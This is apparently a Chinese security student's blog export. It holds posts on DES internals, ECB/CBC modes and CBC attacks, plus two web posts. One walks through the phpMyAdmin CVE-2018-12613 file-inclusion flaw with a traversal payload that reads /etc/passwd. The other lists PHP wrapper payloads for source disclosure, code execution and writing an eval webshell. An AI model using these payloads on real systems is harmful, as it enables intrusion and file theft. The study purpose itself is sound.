{"meta":{"title":"Yk2's Blog","subtitle":"the only Five of 0xfa","description":null,"author":"Yk2","url":"http://www.yk2.work","root":"/"},"pages":[{"title":"about","date":"2019-10-31T17:49:54.000Z","updated":"2019-10-31T18:03:41.158Z","comments":true,"path":"about/index.html","permalink":"http://www.yk2.work/about/index.html","excerpt":"","text":"Who am i? web 菜狗 南山不睡学校学生 hollow knight player 做梦都想变强,于是天天做梦 欢迎与我交朋友!"}],"posts":[{"title":"DES加密步骤详解","slug":"des","date":"2019-10-31T16:40:49.000Z","updated":"2019-10-31T16:41:30.891Z","comments":true,"path":"2019/11/01/des/","link":"","permalink":"http://www.yk2.work/2019/11/01/des/","excerpt":"","text":"DES是一个分组加密算法.以64为为分组对数据加密.64为一组明文从算法的一段输入,64位密文输出. DES是对称算法 密钥长度为56位(数字长度为64位,但每个第8位都做奇偶校验数)初始置换把明文输入块分为64份.然后排列成下面所示密文(IP)输出: 58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,57,49,41,33,25,17, 9,1,59,51,43,35,27,19,11,3,61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7,———————————————— 迭代加密假设Bi是第i次迭代的结果,Li和Ri是Bi的左半部分和右半部分.Ki是第i轮的48位密钥,且f是实现代替,置换和密钥异或等运算的函数,那么每一轮就是: Ln = R(n - 1)；Rn = L(n - 1)⊕f(Rn-1,kn-1)函数f函数f分为四步:密钥置换,扩展置换,S盒代替,P盒置换. 密钥置换在DES每一轮中,56位(64位移去8的倍数)密钥进行如下表所示排列: 57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4———————————————— 然后将密钥分为上下两部分:C0=57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36D0=63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4每部分28位.然后根据轮数,这两部分分别左移一位或两位.即C1=49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,57D1=55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4,63然后合并C1,D1,再经过置换选择表2(PC-2)排列: 14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32 其中第9,18,22,25,35,38,43,54位惨遭除去…变为48位密钥K1.这一步被称为压缩置换 C1和D1再次经过循环左移,生成C2和D2,合并后通过PC-2生成子密钥K2. C2和D2再次经过循环左移,生成C3和D3,合并后通过PC-2生成子密钥K3…… 以此类推得到子密钥K1-K16.扩展替换将数据的右边部分Ri按照上图所示扩展. 思路为首位互换,数据段之间交叉填充. 尽管输出分组大于输入分组,但每个输入分组产生唯一的输出分组.S盒代替将S盒的六位数(binary)输入每一位标记为b1,b2,b3,b4,b5,b6.b1和b6构成一个2位的数yi,range(1,5)b2,b3,b4,b5构成一个4位的数xi.range(1,17).确定了一个坐标(xi,yi)压缩后的密钥和扩展分组异或后,将48位结果送入S盒进行代替运算. 每一个S盒有六位输入,四位输出.且这八个S盒是不同的. 48位的输入块被分为8个6位的分组.每个分组对应一个S盒操作.S1:14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13,S2：15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9,S3：10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12,S4：7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14,S5：2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9, 14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3,S6：12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8, 9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13,S7：4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12,S8：13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11,假如第n组数据输入,就有第n组输出为Sn的(x,y)确定输出的数(转化为二进制就有四位) 假设S8的输入(即异或函数的第43~18位)为110011。第1位和最后一位组合形成了11(二进制)，对应S-盒8的第3行。中间的4位组成形成1001(二进制),对应S-盒8的第9列。所以对应S-盒8第3行第9列值是12。则S-盒输出是1100(二进制)。 P盒置换 S盒运算后得到四位,八盒共得到32位输出.然后依照P盒进行置换.P盒排布如下表所示: 16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25, 置换后的结果与最初的64位分组的左半部分异或,然后左右不分分别交换,开始下一轮迭代. 末置换 末置换是初始置换的逆过程. 将初始置换进行16次迭代加密后,得到L16和R16.将此作为输入进行末置换.末置换表如下:40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,34,2,42,10,50,18,58 26,33,1,41, 9,49,17,57,25,———————————————— 最后一轮结束后,左右密钥并未交换,而是将R16与L16并在一起形成一个分组作为末置换的输入. 末置换结果的输出就是算法结果的输出. DES解密加密与解密唯一不同就是密钥次序是相反的。就是说如果每一轮的加密秘钥分别是K1、K2、K3…K16，那么解密秘钥就是K16、K15、K14…K1。为每一轮产生秘钥的算法也是循环的。加密是秘钥循环左移，解密是秘钥循环右移。解密秘钥每次移动的位数是：0、1、2、2、2、2、2、2、1、2、2、2、2、2、2、1。 代码见git:https://github.com/fishykz/des","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://www.yk2.work/tags/crypto/"}]},{"title":"(ECB,CBC)分组密码的算法类型及模式","slug":"ecbcbc-md","date":"2019-10-31T16:35:11.000Z","updated":"2019-10-31T16:36:56.508Z","comments":true,"path":"2019/11/01/ecbcbc-md/","link":"","permalink":"http://www.yk2.work/2019/11/01/ecbcbc-md/","excerpt":"","text":"电子密码本(ECB)使用分组密码最明显的方式:一个铭文分组加密成一个密文分组因为相同的明文分组永远被加密成相同的密文分组,而且理论上制作成一个包含明文和相应密文的密码本是可能的.然而,如果分组的大小为64位,那么密码本就有2^64项–对于预计算和存储来说太大了. 每个明文分组可被独立地进行加密.不必按次序进行.ECB的问题在于:如果密码分析者有很多明文和密文,那他就可在不知道密钥的情况下获得密码本.在实际情况下,消息格式趋于重复,不同的消息可能会有一些位序列是相同的.这些消息在很大程度上是冗余的或者有很长一段字符串是0和space. 如果密码分析者知道明文A对应密文B,那么无论什么时候这段密文出现在另一段消息中,他都能将其解密. 消息的开头和结尾是致命之处.那里一般规定了消息头和消息尾,会有固定格式. 填充将非64位的密码填充至64位.前面用0,1等有规律的模式填充,最后标记共填充了多少位. 分组重放ECB最严重的问题在敌人可以在不知道密钥的前提下修改加密过的消息,用这种方法可以欺骗指定的接收者,如双花攻击.解决方法:加时间戳新攻击方法:截取时间戳正确的消息,然后更换对应的账户和名称,即可产生一条时间戳正确的恶意明文. 比特币系统解决方法:UTXO(Unspent Transaction Outpu),即未花费交易输出，它在区块链系统中用以记算钱包账户中的余额。对于货币玩家们而言，UTXO就像是你的余额宝，它会随时计算你的仅剩资产。同时由于编码的存在，UXTO的优越性也在于资产的销毁和产生过程都是便于追溯的。时间戳和UTXO的存在标志着，当某个用户意图用同一笔资金进行两次付款的时候，时间戳会自动选择承认最先发出的那笔交易。而UTXO则会确认并验证用于每一笔交易的资产是否存在、是否被花费。如果要在区块链中发起双花攻击，就势必会令系统产生分叉，而多出来的这条岔道，通常不会被系统所承认。DES解决方法:密码分组连链接模式(CBC)采用多次分组加密,每一次分组加密用来修改下一次分组的加密. 密码分组连链接模式(CBC) 采用多次分组加密,每一次分组加密用来修改下一次分组的加密.CBC模式仅在前面的明文分组不同时,才能将完全相同的明文分组加密成不同的密文分组.因此两个相同的信息仍被加密成相同的密文.更糟糕的是:两组信息在它们第一个不同之处出现之前,会被加密成相同的结果 有些信息(如发件人,信头)有相同的开头,虽然不能进行分组重放,但这些相同开头的确给分析者提供了帮助. 防止这种情况发生的办法是用加密随机数据作为第一个分组,这个随机数据被称为初始化向量(IV),它的唯一作用是让信息唯一化.接收者进行解密时,只是用它来填充反馈寄存器.时间标记是一个好的IV.使用IV后相同信息可以被加密乘不同的密文内容.这样窃听者就无法进行分组重放攻击. IV不需要保密错误扩散CBC模式具有 在加密端是密文反馈,在解密端是密文前馈 的性质,这意味着要对错误进行处理.明文分组的单独一位出错将影响密文分以及后面的密文分组.密文的小错误能够转变为明文的更大错误,这就叫错误扩散.在CBC中,出错的分组后的第二分组不会受到影响.尽管CBC能将位错误恢复,但不能回复同步错误.所以CBC必须保证分组结构的完整.","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://www.yk2.work/tags/crypto/"}]},{"title":"CBC安全问题","slug":"cbcsafety-md","date":"2019-10-31T16:34:59.000Z","updated":"2019-10-31T16:40:04.098Z","comments":true,"path":"2019/11/01/cbcsafety-md/","link":"","permalink":"http://www.yk2.work/2019/11/01/cbcsafety-md/","excerpt":"","text":"安全问题CBC比特翻转攻击 已知明文攻击 如果我们有一组明密文,就可以做到通过修改密文,使密文解密出来的特定位置字符变成我们想要的字符. 经常和web一起出[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传 加密流程简述:f()为加密函数,g()为解密函数①:明文1^iv=C1②:f(C1)=密文1③:密文1^明文2=C2④:f(C2)=密文2 攻击流程简述: ①:g(密文2)=C2②:C2^密文1=明文1③:明文1-&gt;所需明文a④:f(明文a^密文1)=所需密文a由于CBC中每一组明文都是按位异或和加密.故可选取对应位进行操作. CBC选择密文攻击 通过CBC的选择密文攻击,可以很快的恢复出IV 明文每次加密前会和IV异或.IV每组会更新为上一组的密文. 待解密的密文为:C|C时: 密文C^C=明文1 密文C^IV=M0 联立,密文C^C^密文^IV=M1^M0 IV=M1^M0^C 故若能够得到两组相同的密文就可以得到IV padding oracle攻击(CBC填充攻击) 常出现在web题目中 分组密码CBC模式的padding oracle攻击需要满足一下特定条件: 加密是采用了PKCS5的填充;(填充的数值时填充字符的个数)填充规则为: 快长度 填充字节 0 08 08 08 08 08 08 08 08 1 07 07 07 07 07 07 07 2 06 06 06 06 06 06 3 05 05 05 05 05 4 04 04 04 04 5 03 03 03 - 攻击者可以和服务器进行交互,可以提交密文,服务器会以某种返回信息告知客户端的padding是否正常. - 攻击效果时在不清楚key和iv的时候解密任意给定的密文. - Padding oracle攻击的原理主要是利用服务器再对padding进行检查的时候不同回显进行的,这是一种侧信道攻击.利用服务器对padding的检查,可以从末尾开始逐位爆破明文 如果接收端发现填充数字不符合长度要求,则不反悔,而符合成功就有返回,返回内容分别为应用层数据出错或返回执行成功,则攻击者可以构造一个R为密文,使得填充长度正确. #### oracle - 对某一个blok C2的解密 - M2=D(C2)^C1 - 可以在C2前拼接一共我们构造的F,向服务器发送F C2解密,爆破最后一位明文的流程如下: - 枚举M2最后以为X; - 构造F的最后一位为x^1; - 发送并观察padding的判断结果是否正确,错误返回1 #### Feistel结构 - 一种简单的题点 - 如果F函数是线性的-&gt;实现已知明文攻击 - F()-&gt;^Ki - L,R - R,L^R^K1 - L^R^K1,L^K1^K2 - L^K1^K2,R^K2^K3 - …… - 每一轮都是可推理的，且每个的内容均为L^R^固定的常数 - 只要知道一组明密文对，就可以解密所有密文","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://www.yk2.work/tags/crypto/"}]},{"title":"CVE-2018-12613 phpadmin文件包含漏洞","slug":"CVE-2018-12613","date":"2019-10-31T16:17:59.000Z","updated":"2019-10-31T16:33:41.479Z","comments":true,"path":"2019/11/01/CVE-2018-12613/","link":"","permalink":"http://www.yk2.work/2019/11/01/CVE-2018-12613/","excerpt":"","text":"网址: https://www.phpmyadmin.net/security/PMASA-2018-4/ 摘要文件包含和远程执行代码攻击 描述发现了一个漏洞，攻击者可以在该漏洞中包含（查看并可能执行）服务器上的文件。该漏洞来自代码的一部分，其中页面在phpMyAdmin中重定向和加载，以及对白名单页面的不正确测试。除以下情况外，必须对攻击者进行身份验证： $ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已控制的任何主机，并在phpMyAdmin上执行任意代码 $ cfg [‘ServerDefault’] = 0：这绕过登录并运行易受攻击的代码，而无需任何身份验证漏洞分析mb_strpos的解读查找字符串在另一个字符串中首次出现的位置 12345678// If we have a valid target, let's load that script insteadif (! empty($_REQUEST['target'])//传入的target不能为空 &amp;&amp; is_string($_REQUEST['target'])//target传入的是字符串 &amp;&amp; ! preg_match('/^index/', $_REQUEST['target'])//不能以index开头 &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist)//target传入参数不能再黑名单数组中 &amp;&amp; Core::checkPageValidity($_REQUEST['target'])) &#123;//经过checkPageValidity检查为真 include $_REQUEST['target']; exit;&#125; 其中blacklist:12$target_blacklist = array ( 'import.php', 'export.php'); 不要让target等于这两个值就可以 Core::checkPageValidity($_REQUEST[‘target’]):代码在libraries\\classes\\Core.php的443~476： 12345678910111213141516171819202122232425262728293031323334353637public static function checkPageValidity(&amp;$page, array $whitelist = []) &#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist;//如果$whitelist为空就引用静态声明的goto_whitelist &#125; if (! isset($page) || !is_string($page)) &#123; return false;//如果$page没有被定义过或者$page不为字符串则return false &#125; if (in_array($page, $whitelist)) &#123; return true;//如果$page在白名单里就return true &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?')//$_page='?'前的$page ); if (in_array($_page, $whitelist)) &#123; return true;//$_page存在$whitelist中的某个值则返回true &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') );//解码后$_page='解码后?'前的$page if (in_array($_page, $whitelist)) &#123; return true; &#125; return false; &#125; 验证白名单(goto_whitelist): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public static $goto_whitelist = array( 'db_datadict.php', 'db_sql.php', 'db_events.php', 'db_export.php', 'db_importdocsql.php', 'db_multi_table_query.php', 'db_structure.php', 'db_import.php', 'db_operations.php', 'db_search.php', 'db_routines.php', 'export.php', 'import.php', 'index.php', 'pdf_pages.php', 'pdf_schema.php', 'server_binlog.php', 'server_collations.php', 'server_databases.php', 'server_engines.php', 'server_export.php', 'server_import.php', 'server_privileges.php', 'server_sql.php', 'server_status.php', 'server_status_advisor.php', 'server_status_monitor.php', 'server_status_queries.php', 'server_status_variables.php', 'server_variables.php', 'sql.php', 'tbl_addfield.php', 'tbl_change.php', 'tbl_create.php', 'tbl_import.php', 'tbl_indexes.php', 'tbl_sql.php', 'tbl_export.php', 'tbl_operations.php', 'tbl_structure.php', 'tbl_relation.php', 'tbl_replace.php', 'tbl_row_action.php', 'tbl_select.php', 'tbl_zoom_select.php', 'transformation_overview.php', 'transformation_wrapper.php', 'user_password.php', ); 故可以构造target=db_datadict.php%253f/../../../../../../../../etc/passwd(%253f可换为%3f,区别在在第几个判断中return true)来满足所有判断条件,并进行文件读取 %253f两次url解码后为?,此时$_page为db_datadict.php,在白名单中. 此时将db_datadict.php看作一个目录,所以要多加一个../回到上一级目录.","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.yk2.work/tags/web/"}]},{"title":"php伪协议实现命令执行","slug":"phpwxy","date":"2019-10-31T16:17:59.000Z","updated":"2019-10-31T16:34:01.283Z","comments":true,"path":"2019/11/01/phpwxy/","link":"","permalink":"http://www.yk2.work/2019/11/01/phpwxy/","excerpt":"","text":"单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞航舰的文件包含函数: include require include_once hightlight_file show_sourcce readfile file_get_contents fopen file封装协议: file:// php://filter php://input zip:// compress.bzip2:// compress.zlib:// data://环境概要:php.ini:allow_url_fopen:on 默认开启 激活了URL形式的fopen封装协议使得可以访问URL对象文件allow_url_include:off 默认关闭,该选项on便是允许URL对象文件 PHP版本&lt;=5.2可以使用%00进行截断0x01 是否需要截断?①:不需要截断:1http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt&lt;?phpinclude($_GET[&apos;file&apos;])?&gt; ②：需要截断：在php版本&lt;=5.2中进行测试是可以使用%00截断的。1http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt%00&lt;?phpinclude($_GET[&apos;file&apos;].’.php’)?&gt; 0x02 allow_url_fopen与allow_url_include是否开启: file://在双OFF下可以使用;使用方法:12file:// [文件的绝对路径和文件名]http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt php://条件:不需要开启allow_url_fopen,仅php://input,php://stdin,php://memory和php://temp需要开启allow_url_include.php://访问各个输入/输出流(I/O streams),在CTF中经常使用的是php://filter和php://input.php://filter用于读取源码,php://input用于执行php代码.php://filter 读取源代码并进行base64编码编出,不然会直接当作php带啊执行就看不到源代码内容.1php://filter/convert.base64-[encode/decode]/resource=xxx php://在双off下可以正常使用实例:1234http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.phppage=php://filter/read=convert.base64-encode/resource=index.php读取网页源码 这里还可以把read=string.tolower/resource=… 可以直接读取源码 php://input可以访问请求的原始数据的只读流,将pos请求中的数据作为php代码执行.实例: 12http://127.0.0.1/cmd.php?file=php://input[POST DATA]: &lt;?php phpinfo();?&gt; 也可以post以下内容生成一句话: 12345&lt;?php fputs(fopen(“shell.php”,”w”),’&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;’);?&gt; zip://,bzip://,zlib://协议在双off的情况下也可以正常使用上述均属于压缩流,可以访问压缩文件的子文件,更重要的是不需要指定后缀名 zip://使用方法:1zip://archive.zip#dir/file.txtzip:// [压缩文件绝对路径]#[压缩文件内的子文件名] 实例:1http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt zlib://协议 1compress.zlib://file.gz 测试现象: 1http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpgorhttp://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg zlib可以打开.gz和.jpg data://双On 1http://127.0.0.1/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;orhttp://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 也可以：http://127.0.0.1/cmd.php?file=data:text/plain,&lt;?php phpinfo()?&gt;orhttp://127.0.0.1/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.yk2.work/tags/web/"}]}]}